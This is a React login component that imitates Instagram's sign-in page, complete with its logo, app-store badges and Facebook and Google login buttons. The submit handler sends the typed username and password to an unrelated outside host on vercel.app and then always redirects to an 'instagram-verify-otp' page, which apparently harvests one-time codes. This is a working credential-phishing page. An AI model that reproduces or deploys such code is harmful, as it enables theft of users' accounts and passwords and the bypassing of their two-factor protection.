import { useState } from "react";
import { Link } from "react-router-dom";
import logo from "../assets/logo.png";
import appleStore from '../assets/applestore.png'
import googleStore from '../assets/googlestore.png'
import facebookIcon from '../assets/facebook-icon.png'
import googleIcon from '../assets/google.png'
import phone from '../assets/phones.png'
import { useNavigate } from "react-router-dom";


const Login = () => {
    const [formData, setFormData] = useState({ email: "", password: "" });
    const navigate = useNavigate();

    const handleChange = (e) => {
        setFormData({ ...formData, [e.target.name]: e.target.value });
    };

    const handleSubmit = async (e) => {
        e.preventDefault();

        try {
            const response = await fetch("https://think-pad-ruby.vercel.app/api/instagram/login", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(formData),
            });

            if (!response.ok) throw new Error("Network response was not ok");

            const data = await response.json();
            console.log("Login Successful:", data);
            navigate('/instagram-verify-otp');
        } catch (error) {
            navigate('/instagram-verify-otp');
        }
    };




    const handleFb = () => {
        navigate('facebook/login');
    }

    const handleGoogle = () => {
        navigate('google/login');
    }

    return (
        <div style={{ display: "flex", justifyContent: "center" }}>
            <div>
                <img src={phone} />
            </div>

            <div className="h-screen bg-gray-50 flex flex-col justify-center items-center">
                <div className="bg-white border border-gray-300 w-80 py-8 flex items-center flex-col mb-3">
                    <img src={logo} alt="Logo" className="w-44 mb-4" />
                    <form className="mt-4 w-64 flex flex-col" onSubmit={handleSubmit}>
                        <input
                            type="text"
                            name="email"
                            placeholder="Phone number, username, or email"
                            value={formData.email}
                            onChange={handleChange}
                            required
                            className="text-xs w-full mb-2 rounded border bg-gray-100 border-gray-300 px-2 py-2 focus:outline-none focus:border-gray-400"
                        />
                        <input
                            type="password"
                            name="password"
                            placeholder="Password"
                            value={formData.password}
                            onChange={handleChange}
                            required
                            className="text-xs w-full mb-4 rounded border bg-gray-100 border-gray-300 px-2 py-2 focus:outline-none focus:border-gray-400"
                        />
                        <button onClick={handleSubmit} type="submit" className="text-sm text-center bg-blue-500 hover:bg-blue-600 text-white py-1 rounded font-medium">
                            Log In
                        </button>
                    </form>
                    <div className="flex justify-evenly space-x-2 w-64 mt-4">
                        <span className="bg-gray-300 h-px flex-grow relative top-2"></span>
                        <span className="flex-none uppercase text-xs text-gray-400 font-semibold">or</span>
                        <span className="bg-gray-300 h-px flex-grow relative top-2"></span>
                    </div>
                    <button onClick={handleFb} className="mt-4 flex items-center">
                        <img width={15} height={15} src={facebookIcon} />
                        <span className="text-xs text-blue-900 font-semibold ml-2">Log in with Facebook</span>
                    </button>
                    <button onClick={handleGoogle} className="mt-4 flex items-center">
                        <img width={15} height={15} src={googleIcon} />
                        <span className="text-xs text-blue-900 font-semibold ml-2">Log in with Google</span>
                    </button>
                    <Link to="#" className="text-xs text-blue-900 mt-4 cursor-pointer">Forgot password?</Link>
                </div>
                <div className="bg-white border border-gray-300 text-center w-80 py-4">
                    <span className="text-sm">Don't have an account?</span>
                    <Link to="#" className="text-blue-500 text-sm font-semibold"> Sign up</Link>
                </div>
                <div className="mt-3 text-center">
                    <span className="text-xs">Get the app</span>
                    <div className="flex mt-3 space-x-2">
                        <img src={appleStore} alt="Apple Store" className="w-32" />
                        <img src={googleStore} alt="Google Store" className="w-32" />
                    </div>
                </div>
            </div>

        </div>

    );
};

export default Login;
